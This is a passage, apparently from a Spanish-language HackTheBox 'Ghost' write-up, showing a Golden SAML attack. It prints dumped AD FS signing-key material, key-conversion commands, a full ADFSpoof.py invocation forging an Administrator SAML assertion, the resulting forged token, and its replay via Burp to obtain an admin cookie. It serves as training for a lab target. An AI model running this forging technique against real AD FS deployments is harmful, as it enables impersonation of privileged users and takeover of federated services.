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
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
```

![expandir](https://0xdf.gitlab.io/icons/collapse.png)

#### Formato de datos

Para ejecutarlo `ADFSpoof.py`, necesito lo siguiente: tanto la clave de firma del token como la clave privada. Hay dos claves privadas. Tomaré ambas; la primera es la que funciona. Tendré que convertirlas a binario. A la clave privada se le deben eliminar los guiones y convertir el formato hexadecimal de nuevo a binario:

```
oxdf@hacky$ echo "8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1" | tr -d "-" | xxd -r -p | tee private_key.bin | xxd
00000000: 8dac a490 702b 3fd6 08d5 bc35 a984 8756  ....p+?....5...V
00000010: d2fa 3b7b 7413 a3c6 2c58 a6f4 58fb 9da1  ..;{t...,X..X...
```

La clave de firma del token solo necesita ser decodificada en base64:

```
oxdf@hacky$ echo "AAAAAQAAAA...[snip]...N/BEsNEUSTXxm" | base64 -d > encrypted_token_siging_key.bin
```

#### Suplantación de SAML

`ADFSpoof.py`toma argumentos de una manera confusa. La estructura del comando es `python ADFSpoof.py [global arguments] <module> [module arguments]`.

Necesitaré los siguientes argumentos globales:

- `-b encrypted_token_siging_key.bin private_key.bin`- el material clave.
- `-s core.ghost.htb`- el dominio objetivo.

El módulo es `saml2`, que luego recibe estos argumentos:

- `--endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse`- el punto final al que se enviarán los datos.
- `--nameidformat ...`- el formato del nombre, que usaré `emailAddress`de la lista [en la documentación de Oracle](https://docs.oracle.com/cd/E19316-01/820-3886/ggwbz/index.html) .
- `--nameid Administrator@ghost.htb`- la dirección de correo electrónico que se va a suplantar.
- `--rpidentifier 'https://core.ghost.htb:8443'`- la parte que confía
- `--assertions ...`- las afirmaciones que dicen que este usuario es el administrador, basándose en la respuesta decodificada anterior.

Al juntar todo esto se genera:

```
oxdf@hacky$ python ADFSpoof.py -b ~/hackthebox/ghost-10.10.11.24/encrypted_token_siging_key.bin ~/hackthebox/ghost-10.10.11.24/private_key.bin -s 'core.ghost.htb' saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfS0VFM1lBIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMy0zMVQxNTo1MToxOS4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfQ0VNMjlYIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDMtMzFUMTU6NTE6MTkuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0NFTTI5WCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPi9JRWRvQkU3ZkJKMjVJQmVzSzJiL2FWRnFVeGdpSHNhZWF4VzBVK2E1L3c9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPmtxTzZnamVvaHFYYW1hMzFrMHJQMGJxNVdNYjlvaENjbTVjU04wVi85VGpJVGYvS1l0WE9SQ1dvOURueDBLNXk2ZzdrS3RtZno4NXNTR21tZmRVSVJCVlFQTG9maHkyRXlyS21YQTYxUkIvRGVXeXRCUitGNFU0SFdTU1REQUdLRWdJckNsL3QxQVp4Z1JRODIreUp6V29ibGZwZGNsdUlyTExXZy9xbTZROXQ0REJFdlRFYlNVWnVwbkxTMFh5aTFUSFZkKzFhVlJJYndJVC94S2FveXhMeDJkcG0ra2VwQm5VZ0g2RzdJT0ZwQUxaMVhyeXZRRTZqQmpwZnoxbHdyTHYybGt6NTg4M202ZllobmdkNDlkY0ZMbVFpUmJDSUVOdnVGYmZSLzZUZXM4SFNUem5FRXBvM1U1cG15YjVXZDF0dHEyeTA0c1FtSHBPQUNXbnlDZ0lRMnAvSGU1dmp4OU1RSThGbUwvbEIrdmE5Zm52VFo5VjhtTlZreUdwWm44amZkRVgrMXM3TlFlczcwSysrWGZWcFlNOWM5ZDc4NmwwNWp5K0ZnaVhjMm1waUg4OVFQNkNhc2RZdW8vSThiRG1NZTVGc25jSWh5cEl2bEl1MlhGWlRqSDlRVFNDSTdFa2JsdVBTQzl6RnFUVWdkVWdqY0RicVJTdUNYSXF1STF0WVdsYjYxRU9EOVNVSkh1Vm9wWGVwc1E1VHZTZWQ2UlNwWllFbzBUSGMyeHFBTmhWSW9LOVpsZDJyYlAwSnErK1didCttRytKSXNOamFsb0o2M0kwSXZseVIvN2xCdXM4KzhNRGhya28wYk9Gbm10R1dLbVR4cWh2YVIwNHFPYkNDWVYwL2E5TnprMU9Ea0RkT2FUZHE2MnFNNmg0ZWptVUpiWFhuelNRPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjUtMDMtMzFUMTU6NTY6MTkuMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTAzLTMxVDE1OjUxOjE5LjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxNjo1MToxOS4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjUtMDMtMzFUMTU6NTE6MTguNTAwWiIgU2Vzc2lvbkluZGV4PSJfQ0VNMjlYIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D
```

Tuve que instalar estos requisitos usando Python 3.11, ya que los paquetes son relativamente antiguos y dejan de funcionar en la versión 3.12.

#### Obtener cookie

Iré a Burp Proxy y buscaré una solicitud POST a `/adfs/saml/postResponse`, enviándola a Burp Repeater. Reemplazaré el cuerpo de la solicitud POST con la respuesta SAML falsificada y la enviaré. Devuelve una nueva cookie:

![imagen-20250331115635883](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331115635883.png)

Voy a añadir esa cookie a mi navegador, actualizar la página `/`y se cargará:

![imagen-20250331115658408](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250331115658408.png)

También es recomendable utilizar la intercepción en Burp Proxy y editar la carga útil allí mismo.